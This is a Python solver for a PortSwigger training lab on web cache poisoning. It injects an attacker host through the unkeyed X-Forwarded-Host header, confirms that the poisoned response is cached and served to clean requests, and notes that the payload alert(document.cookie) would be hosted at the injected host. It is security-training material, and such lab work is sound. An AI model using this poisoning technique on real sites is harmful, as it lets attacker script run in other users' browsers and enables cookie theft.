#!/usr/bin/env python3
"""
Solve the PortSwigger lab "Web cache poisoning with an unkeyed header".

The home page reflects the X-Forwarded-Host header into a <script src> URL,
and the cache doesn't include that header in its cache key (it's "unkeyed").
So a response generated with a malicious X-Forwarded-Host gets cached and
served to other users. This script poisons the cache with a malicious host,
then confirms a clean request — one that never sent the header — is served
the poisoned response.

Note: fully solving the lab also requires hosting alert(document.cookie) at
/resources/js/tracking.js on the exploit server. This script confirms the
poisoning itself.

Lab: https://portswigger.net/web-security/web-cache-poisoning/exploiting-design-flaws/lab-web-cache-poisoning-with-an-unkeyed-header
Usage: python3 solve.py https://YOUR-LAB-ID.web-security-academy.net
"""

import sys
import time
import argparse
import requests

# Verify TLS against the OS trust store (works on networks that inspect HTTPS).
import truststore
truststore.inject_into_ssl()

session = requests.Session()
LAB_URL = None  # set from the CLI arg in main()
REQUEST_TIMEOUT = 10

# The malicious host we inject via X-Forwarded-Host. If the cache serves this
# back to a request that never sent it, the cache is poisoned.
EVIL_HOST = "evil-attacker.com"


def fetch(path, method="GET", headers=None, allow_redirects=True):
    """Send a request to the lab and return the response."""
    url = LAB_URL.rstrip("/") + "/" + path.lstrip("/")
    return session.request(method, url, headers=headers,
                           timeout=REQUEST_TIMEOUT, allow_redirects=allow_redirects)


def report(name, found, detail=""):
    """Print a finding in a consistent [FOUND] / [clean] format."""
    tag = "FOUND" if found else "clean"
    print(f"[{tag}] {name}: {detail}")


def check_cache_poisoning():
    # A unique cache-buster isolates this run to its own cache entry.
    cache_buster = str(int(time.time()))
    path = f"/?cb={cache_buster}"

    # Step 1 — poison: request with a malicious X-Forwarded-Host.
    print(f"[*] Step 1: poisoning cache with X-Forwarded-Host: {EVIL_HOST}")
    poison = fetch(path, headers={"X-Forwarded-Host": EVIL_HOST})
    if EVIL_HOST not in poison.text:
        report("Cache poisoning", False, "X-Forwarded-Host not reflected")
        return
    print(f"    reflected in response (X-Cache: {poison.headers.get('X-Cache')})")

    # Step 2 — verify: request the SAME url with NO malicious header.
    print("[*] Step 2: re-requesting the same URL WITHOUT the header")
    clean = fetch(path)
    cache_status = clean.headers.get("X-Cache")
    print(f"    X-Cache: {cache_status}")

    if EVIL_HOST in clean.text:
        print(f"    poisoned response served to a request that never sent the header")
        report("Cache poisoning", True,
               f"clean request served poisoned response (X-Cache: {cache_status})")
    else:
        report("Cache poisoning", False, "poison not served from cache")


def parse_args():
    parser = argparse.ArgumentParser(
        description="Confirm web cache poisoning via an unkeyed header (PortSwigger lab)."
    )
    parser.add_argument(
        "url",
        help="Base URL of your lab instance, e.g. https://XXXX.web-security-academy.net",
    )
    return parser.parse_args()


def main():
    global LAB_URL
    args = parse_args()
    LAB_URL = args.url

    try:
        check_cache_poisoning()
    except requests.exceptions.RequestException as e:
        print(f"[!] Request failed: {e}")
        sys.exit(1)


if __name__ == "__main__":
    main()